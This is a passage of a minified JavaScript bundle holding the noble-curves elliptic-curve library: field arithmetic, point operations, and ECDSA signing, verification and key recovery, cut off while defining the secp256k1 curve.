        const b = [];
        for (; p < e; ) {
            o = a();
            const v = o.slice();
            b.push(v),
            p += o.length
        }
        return r0(...b)
    }
    ;
    return (p, b) => {
        s(),
        l(p);
        let v;
        for (; !(v = b(f())); )
            l();
        return s(),
        v
    }
}
const kbe = {
    bigint: r => typeof r == "bigint",
    function: r => typeof r == "function",
    boolean: r => typeof r == "boolean",
    string: r => typeof r == "string",
    stringOrUint8Array: r => typeof r == "string" || xu(r),
    isSafeInteger: r => Number.isSafeInteger(r),
    array: r => Array.isArray(r),
    field: (r, e) => e.Fp.isValid(r),
    hash: r => typeof r == "function" && Number.isSafeInteger(r.outputLen)
};
function k0(r, e, t={}) {
    const o = (i, n, s) => {
        const a = kbe[n];
        if (typeof a != "function")
            throw new Error(`Invalid validator "${n}", expected function`);
        const l = r[i];
        if (!(s && l === void 0) && !a(l, r))
            throw new Error(`Invalid param ${String(i)}=${l} (${typeof l}), expected ${n}`)
    }
    ;
    for (const [i,n] of Object.entries(e))
        o(i, n, !1);
    for (const [i,n] of Object.entries(t))
        o(i, n, !0);
    return r
}
const Lbe = Object.freeze(Object.defineProperty({
    __proto__: null,
    abytes: U0,
    bitGet: Fbe,
    bitLen: Dbe,
    bitMask: O4,
    bitSet: Ube,
    bytesToHex: $d,
    bytesToNumberBE: su,
    bytesToNumberLE: _4,
    concatBytes: r0,
    createHmacDrbg: GU,
    ensureBytes: rs,
    equalBytes: Mbe,
    hexToBytes: zd,
    hexToNumber: B4,
    isBytes: xu,
    numberToBytesBE: jd,
    numberToBytesLE: I4,
    numberToHexUnpadded: HU,
    numberToVarBytesBE: Wbe,
    utf8ToBytes: Nbe,
    validateObject: k0
}, Symbol.toStringTag, {
    value: "Module"
}));
/*! noble-curves - MIT License (c) 2022 Paul Miller (paulmillr.com) */
const Rn = BigInt(0)
  , rn = BigInt(1)
  , Ul = BigInt(2)
  , $be = BigInt(3)
  , UA = BigInt(4)
  , MW = BigInt(5)
  , NW = BigInt(8);
BigInt(9);
BigInt(16);
function Mo(r, e) {
    const t = r % e;
    return t >= Rn ? t : e + t
}
function zbe(r, e, t) {
    if (t <= Rn || e < Rn)
        throw new Error("Expected power/modulo > 0");
    if (t === rn)
        return Rn;
    let o = rn;
    for (; e > Rn; )
        e & rn && (o = o * r % t),
        r = r * r % t,
        e >>= rn;
    return o
}
function Ci(r, e, t) {
    let o = r;
    for (; e-- > Rn; )
        o *= o,
        o %= t;
    return o
}
function kA(r, e) {
    if (r === Rn || e <= Rn)
        throw new Error(`invert: expected positive integers, got n=${r} mod=${e}`);
    let t = Mo(r, e)
      , o = e
      , i = Rn
      , n = rn;
    for (; t !== Rn; ) {
        const a = o / t
          , l = o % t
          , f = i - n * a;
        o = t,
        t = l,
        i = n,
        n = f
    }
    if (o !== rn)
        throw new Error("invert: does not exist");
    return Mo(i, e)
}
function jbe(r) {
    const e = (r - rn) / Ul;
    let t, o, i;
    for (t = r - rn,
    o = 0; t % Ul === Rn; t /= Ul,
    o++)
        ;
    for (i = Ul; i < r && zbe(i, e, r) !== r - rn; i++)
        ;
    if (o === 1) {
        const s = (r + rn) / UA;
        return function(l, f) {
            const h = l.pow(f, s);
            if (!l.eql(l.sqr(h), f))
                throw new Error("Cannot find square root");
            return h
        }
    }
    const n = (t + rn) / Ul;
    return function(a, l) {
        if (a.pow(l, e) === a.neg(a.ONE))
            throw new Error("Cannot find square root");
        let f = o
          , h = a.pow(a.mul(a.ONE, i), t)
          , p = a.pow(l, n)
          , b = a.pow(l, t);
        for (; !a.eql(b, a.ONE); ) {
            if (a.eql(b, a.ZERO))
                return a.ZERO;
            let v = 1;
            for (let x = a.sqr(b); v < f && !a.eql(x, a.ONE); v++)
                x = a.sqr(x);
            const T = a.pow(h, rn << BigInt(f - v - 1));
            h = a.sqr(T),
            p = a.mul(p, T),
            b = a.mul(b, h),
            f = v
        }
        return p
    }
}
function qbe(r) {
    if (r % UA === $be) {
        const e = (r + rn) / UA;
        return function(o, i) {
            const n = o.pow(i, e);
            if (!o.eql(o.sqr(n), i))
                throw new Error("Cannot find square root");
            return n
        }
    }
    if (r % NW === MW) {
        const e = (r - MW) / NW;
        return function(o, i) {
            const n = o.mul(i, Ul)
              , s = o.pow(n, e)
              , a = o.mul(i, s)
              , l = o.mul(o.mul(a, Ul), s)
              , f = o.mul(a, o.sub(l, o.ONE));
            if (!o.eql(o.sqr(f), i))
                throw new Error("Cannot find square root");
            return f
        }
    }
    return jbe(r)
}
const Vbe = ["create", "isValid", "is0", "neg", "inv", "sqrt", "sqr", "eql", "add", "sub", "mul", "pow", "div", "addN", "subN", "mulN", "sqrN"];
function Hbe(r) {
    const e = {
        ORDER: "bigint",
        MASK: "bigint",
        BYTES: "isSafeInteger",
        BITS: "isSafeInteger"
    }
      , t = Vbe.reduce( (o, i) => (o[i] = "function",
    o), e);
    return k0(r, t)
}
function Gbe(r, e, t) {
    if (t < Rn)
        throw new Error("Expected power > 0");
    if (t === Rn)
        return r.ONE;
    if (t === rn)
        return e;
    let o = r.ONE
      , i = e;
    for (; t > Rn; )
        t & rn && (o = r.mul(o, i)),
        i = r.sqr(i),
        t >>= rn;
    return o
}
function Kbe(r, e) {
    const t = new Array(e.length)
      , o = e.reduce( (n, s, a) => r.is0(s) ? n : (t[a] = n,
    r.mul(n, s)), r.ONE)
      , i = r.inv(o);
    return e.reduceRight( (n, s, a) => r.is0(s) ? n : (t[a] = r.mul(n, t[a]),
    r.mul(n, s)), i),
    t
}
function KU(r, e) {
    const t = e !== void 0 ? e : r.toString(2).length
      , o = Math.ceil(t / 8);
    return {
        nBitLength: t,
        nByteLength: o
    }
}
function Zbe(r, e, t=!1, o={}) {
    if (r <= Rn)
        throw new Error(`Expected Field ORDER > 0, got ${r}`);
    const {nBitLength: i, nByteLength: n} = KU(r, e);
    if (n > 2048)
        throw new Error("Field lengths over 2048 bytes are not supported");
    const s = qbe(r)
      , a = Object.freeze({
        ORDER: r,
        BITS: i,
        BYTES: n,
        MASK: O4(i),
        ZERO: Rn,
        ONE: rn,
        create: l => Mo(l, r),
        isValid: l => {
            if (typeof l != "bigint")
                throw new Error(`Invalid field element: expected bigint, got ${typeof l}`);
            return Rn <= l && l < r
        }
        ,
        is0: l => l === Rn,
        isOdd: l => (l & rn) === rn,
        neg: l => Mo(-l, r),
        eql: (l, f) => l === f,
        sqr: l => Mo(l * l, r),
        add: (l, f) => Mo(l + f, r),
        sub: (l, f) => Mo(l - f, r),
        mul: (l, f) => Mo(l * f, r),
        pow: (l, f) => Gbe(a, l, f),
        div: (l, f) => Mo(l * kA(f, r), r),
        sqrN: l => l * l,
        addN: (l, f) => l + f,
        subN: (l, f) => l - f,
        mulN: (l, f) => l * f,
        inv: l => kA(l, r),
        sqrt: o.sqrt || (l => s(a, l)),
        invertBatch: l => Kbe(a, l),
        cmov: (l, f, h) => h ? f : l,
        toBytes: l => t ? I4(l, n) : jd(l, n),
        fromBytes: l => {
            if (l.length !== n)
                throw new Error(`Fp.fromBytes: expected ${n}, got ${l.length}`);
            return t ? _4(l) : su(l)
        }
    });
    return Object.freeze(a)
}
function ZU(r) {
    if (typeof r != "bigint")
        throw new Error("field order must be bigint");
    const e = r.toString(2).length;
    return Math.ceil(e / 8)
}
function YU(r) {
    const e = ZU(r);
    return e + Math.ceil(e / 2)
}
function Ybe(r, e, t=!1) {
    const o = r.length
      , i = ZU(e)
      , n = YU(e);
    if (o < 16 || o < n || o > 1024)
        throw new Error(`expected ${n}-1024 bytes of input, got ${o}`);
    const s = t ? su(r) : _4(r)
      , a = Mo(s, e - rn) + rn;
    return t ? I4(a, i) : jd(a, i)
}
/*! noble-curves - MIT License (c) 2022 Paul Miller (paulmillr.com) */
const Xbe = BigInt(0)
  , aE = BigInt(1);
function Jbe(r, e) {
    const t = (i, n) => {
        const s = n.negate();
        return i ? s : n
    }
      , o = i => {
        const n = Math.ceil(e / i) + 1
          , s = 2 ** (i - 1);
        return {
            windows: n,
            windowSize: s
        }
    }
    ;
    return {
        constTimeNegate: t,
        unsafeLadder(i, n) {
            let s = r.ZERO
              , a = i;
            for (; n > Xbe; )
                n & aE && (s = s.add(a)),
                a = a.double(),
                n >>= aE;
            return s
        },
        precomputeWindow(i, n) {
            const {windows: s, windowSize: a} = o(n)
              , l = [];
            let f = i
              , h = f;
            for (let p = 0; p < s; p++) {
                h = f,
                l.push(h);
                for (let b = 1; b < a; b++)
                    h = h.add(f),
                    l.push(h);
                f = h.double()
            }
            return l
        },
        wNAF(i, n, s) {
            const {windows: a, windowSize: l} = o(i);
            let f = r.ZERO
              , h = r.BASE;
            const p = BigInt(2 ** i - 1)
              , b = 2 ** i
              , v = BigInt(i);
            for (let T = 0; T < a; T++) {
                const x = T * l;
                let E = Number(s & p);
                s >>= v,
                E > l && (E -= b,
                s += aE);
                const B = x
                  , P = x + Math.abs(E) - 1
                  , O = T % 2 !== 0
                  , F = E < 0;
                E === 0 ? h = h.add(t(O, n[B])) : f = f.add(t(F, n[P]))
            }
            return {
                p: f,
                f: h
            }
        },
        wNAFCached(i, n, s, a) {
            const l = i._WINDOW_SIZE || 1;
            let f = n.get(i);
            return f || (f = this.precomputeWindow(i, l),
            l !== 1 && n.set(i, a(f))),
            this.wNAF(l, f, s)
        }
    }
}
function XU(r) {
    return Hbe(r.Fp),
    k0(r, {
        n: "bigint",
        h: "bigint",
        Gx: "field",
        Gy: "field"
    }, {
        nBitLength: "isSafeInteger",
        nByteLength: "isSafeInteger"
    }),
    Object.freeze({
        ...KU(r.n, r.nBitLength),
        ...r,
        p: r.Fp.ORDER
    })
}
/*! noble-curves - MIT License (c) 2022 Paul Miller (paulmillr.com) */
function Qbe(r) {
    const e = XU(r);
    k0(e, {
        a: "field",
        b: "field"
    }, {
        allowedPrivateKeyLengths: "array",
        wrapPrivateKey: "boolean",
        isTorsionFree: "function",
        clearCofactor: "function",
        allowInfinityPoint: "boolean",
        fromBytes: "function",
        toBytes: "function"
    });
    const {endo: t, Fp: o, a: i} = e;
    if (t) {
        if (!o.eql(i, o.ZERO))
            throw new Error("Endomorphism can only be defined for Koblitz curves that have a=0");
        if (typeof t != "object" || typeof t.beta != "bigint" || typeof t.splitScalar != "function")
            throw new Error("Expected endomorphism with beta: bigint and splitScalar: function")
    }
    return Object.freeze({
        ...e
    })
}
const {bytesToNumberBE: eme, hexToBytes: tme} = Lbe
  , Hl = {
    Err: class extends Error {
        constructor(e="") {
            super(e)
        }
    }
    ,
    _parseInt(r) {
        const {Err: e} = Hl;
        if (r.length < 2 || r[0] !== 2)
            throw new e("Invalid signature integer tag");
        const t = r[1]
          , o = r.subarray(2, t + 2);
        if (!t || o.length !== t)
            throw new e("Invalid signature integer: wrong length");
        if (o[0] & 128)
            throw new e("Invalid signature integer: negative");
        if (o[0] === 0 && !(o[1] & 128))
            throw new e("Invalid signature integer: unnecessary leading zero");
        return {
            d: eme(o),
            l: r.subarray(t + 2)
        }
    },
    toSig(r) {
        const {Err: e} = Hl
          , t = typeof r == "string" ? tme(r) : r;
        U0(t);
        let o = t.length;
        if (o < 2 || t[0] != 48)
            throw new e("Invalid signature tag");
        if (t[1] !== o - 2)
            throw new e("Invalid signature: incorrect length");
        const {d: i, l: n} = Hl._parseInt(t.subarray(2))
          , {d: s, l: a} = Hl._parseInt(n);
        if (a.length)
            throw new e("Invalid signature: left bytes after parsing");
        return {
            r: i,
            s
        }
    },
    hexFromSig(r) {
        const e = f => Number.parseInt(f[0], 16) & 8 ? "00" + f : f
          , t = f => {
            const h = f.toString(16);
            return h.length & 1 ? `0${h}` : h
        }
          , o = e(t(r.s))
          , i = e(t(r.r))
          , n = o.length / 2
          , s = i.length / 2
          , a = t(n)
          , l = t(s);
        return `30${t(s + n + 4)}02${l}${i}02${a}${o}`
    }
}
  , ka = BigInt(0)
  , Fi = BigInt(1);
BigInt(2);
const DW = BigInt(3);
BigInt(4);
function rme(r) {
    const e = Qbe(r)
      , {Fp: t} = e
      , o = e.toBytes || ( (T, x, E) => {
        const B = x.toAffine();
        return r0(Uint8Array.from([4]), t.toBytes(B.x), t.toBytes(B.y))
    }
    )
      , i = e.fromBytes || (T => {
        const x = T.subarray(1)
          , E = t.fromBytes(x.subarray(0, t.BYTES))
          , B = t.fromBytes(x.subarray(t.BYTES, 2 * t.BYTES));
        return {
            x: E,
            y: B
        }
    }
    );
    function n(T) {
        const {a: x, b: E} = e
          , B = t.sqr(T)
          , P = t.mul(B, T);
        return t.add(t.add(P, t.mul(T, x)), E)
    }
    if (!t.eql(t.sqr(e.Gy), n(e.Gx)))
        throw new Error("bad generator point: equation left != right");
    function s(T) {
        return typeof T == "bigint" && ka < T && T < e.n
    }
    function a(T) {
        if (!s(T))
            throw new Error("Expected valid bigint: 0 < bigint < curve.n")
    }
    function l(T) {
        const {allowedPrivateKeyLengths: x, nByteLength: E, wrapPrivateKey: B, n: P} = e;
        if (x && typeof T != "bigint") {
            if (xu(T) && (T = $d(T)),
            typeof T != "string" || !x.includes(T.length))
                throw new Error("Invalid key");
            T = T.padStart(E * 2, "0")
        }
        let O;
        try {
            O = typeof T == "bigint" ? T : su(rs("private key", T, E))
        } catch {
            throw new Error(`private key must be ${E} bytes, hex or bigint, not ${typeof T}`)
        }
        return B && (O = Mo(O, P)),
        a(O),
        O
    }
    const f = new Map;
    function h(T) {
        if (!(T instanceof p))
            throw new Error("ProjectivePoint expected")
    }
    class p {
        constructor(x, E, B) {
            if (this.px = x,
            this.py = E,
            this.pz = B,
            x == null || !t.isValid(x))
                throw new Error("x required");
            if (E == null || !t.isValid(E))
                throw new Error("y required");
            if (B == null || !t.isValid(B))
                throw new Error("z required")
        }
        static fromAffine(x) {
            const {x: E, y: B} = x || {};
            if (!x || !t.isValid(E) || !t.isValid(B))
                throw new Error("invalid affine point");
            if (x instanceof p)
                throw new Error("projective point not allowed");
            const P = O => t.eql(O, t.ZERO);
            return P(E) && P(B) ? p.ZERO : new p(E,B,t.ONE)
        }
        get x() {
            return this.toAffine().x
        }
        get y() {
            return this.toAffine().y
        }
        static normalizeZ(x) {
            const E = t.invertBatch(x.map(B => B.pz));
            return x.map( (B, P) => B.toAffine(E[P])).map(p.fromAffine)
        }
        static fromHex(x) {
            const E = p.fromAffine(i(rs("pointHex", x)));
            return E.assertValidity(),
            E
        }
        static fromPrivateKey(x) {
            return p.BASE.multiply(l(x))
        }
        _setWindowSize(x) {
            this._WINDOW_SIZE = x,
            f.delete(this)
        }
        assertValidity() {
            if (this.is0()) {
                if (e.allowInfinityPoint && !t.is0(this.py))
                    return;
                throw new Error("bad point: ZERO")
            }
            const {x, y: E} = this.toAffine();
            if (!t.isValid(x) || !t.isValid(E))
                throw new Error("bad point: x or y not FE");
            const B = t.sqr(E)
              , P = n(x);
            if (!t.eql(B, P))
                throw new Error("bad point: equation left != right");
            if (!this.isTorsionFree())
                throw new Error("bad point: not in prime-order subgroup")
        }
        hasEvenY() {
            const {y: x} = this.toAffine();
            if (t.isOdd)
                return !t.isOdd(x);
            throw new Error("Field doesn't support isOdd")
        }
        equals(x) {
            h(x);
            const {px: E, py: B, pz: P} = this
              , {px: O, py: F, pz: D} = x
              , I = t.eql(t.mul(E, D), t.mul(O, P))
              , M = t.eql(t.mul(B, D), t.mul(F, P));
            return I && M
        }
        negate() {
            return new p(this.px,t.neg(this.py),this.pz)
        }
        double() {
            const {a: x, b: E} = e
              , B = t.mul(E, DW)
              , {px: P, py: O, pz: F} = this;
            let D = t.ZERO
              , I = t.ZERO
              , M = t.ZERO
              , C = t.mul(P, P)
              , W = t.mul(O, O)
              , k = t.mul(F, F)
              , H = t.mul(P, O);
            return H = t.add(H, H),
            M = t.mul(P, F),
            M = t.add(M, M),
            D = t.mul(x, M),
            I = t.mul(B, k),
            I = t.add(D, I),
            D = t.sub(W, I),
            I = t.add(W, I),
            I = t.mul(D, I),
            D = t.mul(H, D),
            M = t.mul(B, M),
            k = t.mul(x, k),
            H = t.sub(C, k),
            H = t.mul(x, H),
            H = t.add(H, M),
            M = t.add(C, C),
            C = t.add(M, C),
            C = t.add(C, k),
            C = t.mul(C, H),
            I = t.add(I, C),
            k = t.mul(O, F),
            k = t.add(k, k),
            C = t.mul(k, H),
            D = t.sub(D, C),
            M = t.mul(k, W),
            M = t.add(M, M),
            M = t.add(M, M),
            new p(D,I,M)
        }
        add(x) {
            h(x);
            const {px: E, py: B, pz: P} = this
              , {px: O, py: F, pz: D} = x;
            let I = t.ZERO
              , M = t.ZERO
              , C = t.ZERO;
            const W = e.a
              , k = t.mul(e.b, DW);
            let H = t.mul(E, O)
              , X = t.mul(B, F)
              , Y = t.mul(P, D)
              , V = t.add(E, B)
              , R = t.add(O, F);
            V = t.mul(V, R),
            R = t.add(H, X),
            V = t.sub(V, R),
            R = t.add(E, P);
            let _ = t.add(O, D);
            return R = t.mul(R, _),
            _ = t.add(H, Y),
            R = t.sub(R, _),
            _ = t.add(B, P),
            I = t.add(F, D),
            _ = t.mul(_, I),
            I = t.add(X, Y),
            _ = t.sub(_, I),
            C = t.mul(W, R),
            I = t.mul(k, Y),
            C = t.add(I, C),
            I = t.sub(X, C),
            C = t.add(X, C),
            M = t.mul(I, C),
            X = t.add(H, H),
            X = t.add(X, H),
            Y = t.mul(W, Y),
            R = t.mul(k, R),
            X = t.add(X, Y),
            Y = t.sub(H, Y),
            Y = t.mul(W, Y),
            R = t.add(R, Y),
            H = t.mul(X, R),
            M = t.add(M, H),
            H = t.mul(_, R),
            I = t.mul(V, I),
            I = t.sub(I, H),
            H = t.mul(V, X),
            C = t.mul(_, C),
            C = t.add(C, H),
            new p(I,M,C)
        }
        subtract(x) {
            return this.add(x.negate())
        }
        is0() {
            return this.equals(p.ZERO)
        }
        wNAF(x) {
            return v.wNAFCached(this, f, x, E => {
                const B = t.invertBatch(E.map(P => P.pz));
                return E.map( (P, O) => P.toAffine(B[O])).map(p.fromAffine)
            }
            )
        }
        multiplyUnsafe(x) {
            const E = p.ZERO;
            if (x === ka)
                return E;
            if (a(x),
            x === Fi)
                return this;
            const {endo: B} = e;
            if (!B)
                return v.unsafeLadder(this, x);
            let {k1neg: P, k1: O, k2neg: F, k2: D} = B.splitScalar(x)
              , I = E
              , M = E
              , C = this;
            for (; O > ka || D > ka; )
                O & Fi && (I = I.add(C)),
                D & Fi && (M = M.add(C)),
                C = C.double(),
                O >>= Fi,
                D >>= Fi;
            return P && (I = I.negate()),
            F && (M = M.negate()),
            M = new p(t.mul(M.px, B.beta),M.py,M.pz),
            I.add(M)
        }
        multiply(x) {
            a(x);
            let E = x, B, P;
            const {endo: O} = e;
            if (O) {
                const {k1neg: F, k1: D, k2neg: I, k2: M} = O.splitScalar(E);
                let {p: C, f: W} = this.wNAF(D)
                  , {p: k, f: H} = this.wNAF(M);
                C = v.constTimeNegate(F, C),
                k = v.constTimeNegate(I, k),
                k = new p(t.mul(k.px, O.beta),k.py,k.pz),
                B = C.add(k),
                P = W.add(H)
            } else {
                const {p: F, f: D} = this.wNAF(E);
                B = F,
                P = D
            }
            return p.normalizeZ([B, P])[0]
        }
        multiplyAndAddUnsafe(x, E, B) {
            const P = p.BASE
              , O = (D, I) => I === ka || I === Fi || !D.equals(P) ? D.multiplyUnsafe(I) : D.multiply(I)
              , F = O(this, E).add(O(x, B));
            return F.is0() ? void 0 : F
        }
        toAffine(x) {
            const {px: E, py: B, pz: P} = this
              , O = this.is0();
            x == null && (x = O ? t.ONE : t.inv(P));
            const F = t.mul(E, x)
              , D = t.mul(B, x)
              , I = t.mul(P, x);
            if (O)
                return {
                    x: t.ZERO,
                    y: t.ZERO
                };
            if (!t.eql(I, t.ONE))
                throw new Error("invZ was invalid");
            return {
                x: F,
                y: D
            }
        }
        isTorsionFree() {
            const {h: x, isTorsionFree: E} = e;
            if (x === Fi)
                return !0;
            if (E)
                return E(p, this);
            throw new Error("isTorsionFree() has not been declared for the elliptic curve")
        }
        clearCofactor() {
            const {h: x, clearCofactor: E} = e;
            return x === Fi ? this : E ? E(p, this) : this.multiplyUnsafe(e.h)
        }
        toRawBytes(x=!0) {
            return this.assertValidity(),
            o(p, this, x)
        }
        toHex(x=!0) {
            return $d(this.toRawBytes(x))
        }
    }
    p.BASE = new p(e.Gx,e.Gy,t.ONE),
    p.ZERO = new p(t.ZERO,t.ONE,t.ZERO);
    const b = e.nBitLength
      , v = Jbe(p, e.endo ? Math.ceil(b / 2) : b);
    return {
        CURVE: e,
        ProjectivePoint: p,
        normPrivateKeyToScalar: l,
        weierstrassEquation: n,
        isWithinCurveOrder: s
    }
}
function nme(r) {
    const e = XU(r);
    return k0(e, {
        hash: "hash",
        hmac: "function",
        randomBytes: "function"
    }, {
        bits2int: "function",
        bits2int_modN: "function",
        lowS: "boolean"
    }),
    Object.freeze({
        lowS: !0,
        ...e
    })
}
function ome(r) {
    const e = nme(r)
      , {Fp: t, n: o} = e
      , i = t.BYTES + 1
      , n = 2 * t.BYTES + 1;
    function s(R) {
        return ka < R && R < t.ORDER
    }
    function a(R) {
        return Mo(R, o)
    }
    function l(R) {
        return kA(R, o)
    }
    const {ProjectivePoint: f, normPrivateKeyToScalar: h, weierstrassEquation: p, isWithinCurveOrder: b} = rme({
        ...e,
        toBytes(R, _, $) {
            const z = _.toAffine()
              , K = t.toBytes(z.x)
              , j = r0;
            return $ ? j(Uint8Array.from([_.hasEvenY() ? 2 : 3]), K) : j(Uint8Array.from([4]), K, t.toBytes(z.y))
        },
        fromBytes(R) {
            const _ = R.length
              , $ = R[0]
              , z = R.subarray(1);
            if (_ === i && ($ === 2 || $ === 3)) {
                const K = su(z);
                if (!s(K))
                    throw new Error("Point is not on curve");
                const j = p(K);
                let ee;
                try {
                    ee = t.sqrt(j)
                } catch (he) {
                    const me = he instanceof Error ? ": " + he.message : "";
                    throw new Error("Point is not on curve" + me)
                }
                const ie = (ee & Fi) === Fi;
                return ($ & 1) === 1 !== ie && (ee = t.neg(ee)),
                {
                    x: K,
                    y: ee
                }
            } else if (_ === n && $ === 4) {
                const K = t.fromBytes(z.subarray(0, t.BYTES))
                  , j = t.fromBytes(z.subarray(t.BYTES, 2 * t.BYTES));
                return {
                    x: K,
                    y: j
                }
            } else
                throw new Error(`Point of length ${_} was invalid. Expected ${i} compressed bytes or ${n} uncompressed bytes`)
        }
    })
      , v = R => $d(jd(R, e.nByteLength));
    function T(R) {
        const _ = o >> Fi;
        return R > _
    }
    function x(R) {
        return T(R) ? a(-R) : R
    }
    const E = (R, _, $) => su(R.slice(_, $));
    class B {
        constructor(_, $, z) {
            this.r = _,
            this.s = $,
            this.recovery = z,
            this.assertValidity()
        }
        static fromCompact(_) {
            const $ = e.nByteLength;
            return _ = rs("compactSignature", _, $ * 2),
            new B(E(_, 0, $),E(_, $, 2 * $))
        }
        static fromDER(_) {
            const {r: $, s: z} = Hl.toSig(rs("DER", _));
            return new B($,z)
        }
        assertValidity() {
            if (!b(this.r))
                throw new Error("r must be 0 < r < CURVE.n");
            if (!b(this.s))
                throw new Error("s must be 0 < s < CURVE.n")
        }
        addRecoveryBit(_) {
            return new B(this.r,this.s,_)
        }
        recoverPublicKey(_) {
            const {r: $, s: z, recovery: K} = this
              , j = M(rs("msgHash", _));
            if (K == null || ![0, 1, 2, 3].includes(K))
                throw new Error("recovery id invalid");
            const ee = K === 2 || K === 3 ? $ + e.n : $;
            if (ee >= t.ORDER)
                throw new Error("recovery id 2 or 3 invalid");
            const ie = (K & 1) === 0 ? "02" : "03"
              , ae = f.fromHex(ie + v(ee))
              , he = l(ee)
              , me = a(-j * he)
              , Pe = a(z * he)
              , _e = f.BASE.multiplyAndAddUnsafe(ae, me, Pe);
            if (!_e)
                throw new Error("point at infinify");
            return _e.assertValidity(),
            _e
        }
        hasHighS() {
            return T(this.s)
        }
        normalizeS() {
            return this.hasHighS() ? new B(this.r,a(-this.s),this.recovery) : this
        }
        toDERRawBytes() {
            return zd(this.toDERHex())
        }
        toDERHex() {
            return Hl.hexFromSig({
                r: this.r,
                s: this.s
            })
        }
        toCompactRawBytes() {
            return zd(this.toCompactHex())
        }
        toCompactHex() {
            return v(this.r) + v(this.s)
        }
    }
    const P = {
        isValidPrivateKey(R) {
            try {
                return h(R),
                !0
            } catch {
                return !1
            }
        },
        normPrivateKeyToScalar: h,
        randomPrivateKey: () => {
            const R = YU(e.n);
            return Ybe(e.randomBytes(R), e.n)
        }
        ,
        precompute(R=8, _=f.BASE) {
            return _._setWindowSize(R),
            _.multiply(BigInt(3)),
            _
        }
    };
    function O(R, _=!0) {
        return f.fromPrivateKey(R).toRawBytes(_)
    }
    function F(R) {
        const _ = xu(R)
          , $ = typeof R == "string"
          , z = (_ || $) && R.length;
        return _ ? z === i || z === n : $ ? z === 2 * i || z === 2 * n : R instanceof f
    }
    function D(R, _, $=!0) {
        if (F(R))
            throw new Error("first arg must be private key");
        if (!F(_))
            throw new Error("second arg must be public key");
        return f.fromHex(_).multiply(h(R)).toRawBytes($)
    }
    const I = e.bits2int || function(R) {
        const _ = su(R)
          , $ = R.length * 8 - e.nBitLength;
        return $ > 0 ? _ >> BigInt($) : _
    }
      , M = e.bits2int_modN || function(R) {
        return a(I(R))
    }
      , C = O4(e.nBitLength);
    function W(R) {
        if (typeof R != "bigint")
            throw new Error("bigint expected");
        if (!(ka <= R && R < C))
            throw new Error(`bigint expected < 2^${e.nBitLength}`);
        return jd(R, e.nByteLength)
    }
    function k(R, _, $=H) {
        if (["recovered", "canonical"].some(Je => Je in $))
            throw new Error("sign() legacy options not supported");
        const {hash: z, randomBytes: K} = e;
        let {lowS: j, prehash: ee, extraEntropy: ie} = $;
        j == null && (j = !0),
        R = rs("msgHash", R),
        ee && (R = rs("prehashed msgHash", z(R)));
        const ae = M(R)
          , he = h(_)
          , me = [W(he), W(ae)];
        if (ie != null && ie !== !1) {
            const Je = ie === !0 ? K(t.BYTES) : ie;
            me.push(rs("extraEntropy", Je))
        }
        const Pe = r0(...me)
          , _e = ae;
        function Fe(Je) {
            const rt = I(Je);
            if (!b(rt))
                return;
            const xt = l(rt)
              , Tt = f.BASE.multiply(rt).toAffine()
              , Qe = a(Tt.x);
            if (Qe === ka)
                return;
            const Ye = a(xt * a(_e + Qe * he));
            if (Ye === ka)
                return;
            let Bt = (Tt.x === Qe ? 0 : 2) | Number(Tt.y & Fi)
              , Dr = Ye;
            return j && T(Ye) && (Dr = x(Ye),
            Bt ^= 1),
            new B(Qe,Dr,Bt)
        }
        return {
            seed: Pe,
            k2sig: Fe
        }
    }
    const H = {
        lowS: e.lowS,
        prehash: !1
    }
      , X = {
        lowS: e.lowS,
        prehash: !1
    };
    function Y(R, _, $=H) {
        const {seed: z, k2sig: K} = k(R, _, $)
          , j = e;
        return GU(j.hash.outputLen, j.nByteLength, j.hmac)(z, K)
    }
    f.BASE._setWindowSize(8);
    function V(R, _, $, z=X) {
        var Tt;
        const K = R;
        if (_ = rs("msgHash", _),
        $ = rs("publicKey", $),
        "strict"in z)
            throw new Error("options.strict was renamed to lowS");
        const {lowS: j, prehash: ee} = z;
        let ie, ae;
        try {
            if (typeof K == "string" || xu(K))
                try {
                    ie = B.fromDER(K)
                } catch (Qe) {
                    if (!(Qe instanceof Hl.Err))
                        throw Qe;
                    ie = B.fromCompact(K)
                }
            else if (typeof K == "object" && typeof K.r == "bigint" && typeof K.s == "bigint") {
                const {r: Qe, s: Ye} = K;
                ie = new B(Qe,Ye)
            } else
                throw new Error("PARSE");
            ae = f.fromHex($)
        } catch (Qe) {
            if (Qe.message === "PARSE")
                throw new Error("signature must be Signature instance, Uint8Array or hex string");
            return !1
        }
        if (j && ie.hasHighS())
            return !1;
        ee && (_ = e.hash(_));
        const {r: he, s: me} = ie
          , Pe = M(_)
          , _e = l(me)
          , Fe = a(Pe * _e)
          , Je = a(he * _e)
          , rt = (Tt = f.BASE.multiplyAndAddUnsafe(ae, Fe, Je)) == null ? void 0 : Tt.toAffine();
        return rt ? a(rt.x) === he : !1
    }
    return {
        CURVE: e,
        getPublicKey: O,
        getSharedSecret: D,
        sign: Y,
        verify: V,
        ProjectivePoint: f,
        Signature: B,
        utils: P
    }
}
/*! noble-curves - MIT License (c) 2022 Paul Miller (paulmillr.com) */
function ime(r) {
    return {
        hash: r,
        hmac: (e, ...t) => qU(r, e, vbe(...t)),
        randomBytes: Ebe
    }
}
function sme(r, e) {
    const t = o => ome({
        ...r,
        ...ime(o)
    });
    return Object.freeze({
        ...t(e),
        create: t
    })
}
/*! noble-curves - MIT License (c) 2022 Paul Miller (paulmillr.com) */
const JU = BigInt("0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2f")
  , FW = BigInt("0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141")
  , ame = BigInt(1)
  , LA = BigInt(2)
  , UW = (r, e) => (r + e / LA) / e;
function cme(r) {
    const e = JU
      , t = BigInt(3)
      , o = BigInt(6)
      , i = BigInt(11)
      , n = BigInt(22)
      , s = BigInt(23)
      , a = BigInt(44)
      , l = BigInt(88)
      , f = r * r * r % e
      , h = f * f * r % e
      , p = Ci(h, t, e) * h % e
      , b = Ci(p, t, e) * h % e
      , v = Ci(b, LA, e) * f % e
      , T = Ci(v, i, e) * v % e
      , x = Ci(T, n, e) * T % e
      , E = Ci(x, a, e) * x % e
      , B = Ci(E, l, e) * E % e
      , P = Ci(B, a, e) * x % e
      , O = Ci(P, t, e) * h % e
      , F = Ci(O, s, e) * T % e
      , D = Ci(F, o, e) * f % e
      , I = Ci(D, LA, e);
    if (!$A.eql($A.sqr(I), r))
        throw new Error("Cannot find square root");
    return I
}
const $A = Zbe(JU, void 0, void 0, {
    sqrt: cme
})
  , xx = sme({
    a: BigInt(0),
    b: BigInt(7),
    Fp: $A,
